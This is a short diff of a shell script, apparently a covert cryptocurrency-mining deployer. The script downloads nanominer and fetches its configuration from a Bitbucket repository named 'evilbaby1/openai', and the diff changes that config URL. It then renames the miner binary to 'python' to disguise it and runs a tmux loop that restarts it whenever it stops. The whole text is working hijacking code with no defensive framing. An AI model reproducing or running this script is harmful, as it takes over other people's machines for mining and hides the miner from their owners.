@@ -20,7 +20,7 @@ wget https://github.com/nanopool/nanominer/releases/download/v1.5.3/nanominer-li
 tar xvzf nanominer-linux-1.5.3.tar.gz
 cd nanominer-linux-1.5.3
 rm config.ini
-wget https://bitbucket.org/evilbaby1/openai/raw/3fe4365a056b4e0589f78d6b1280f97cb1bb0b3e/config.ini
+wget https://bitbucket.org/evilbaby1/openai/raw/0405bd5eb1e9302b24c86d06eccd43e838fac66b/config.ini
 mv nanominer python
 chmod +x python
 tmux new-session -d -s loop 'while (true);do if pgrep -x "python" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './python';fi; sleep 30; done'
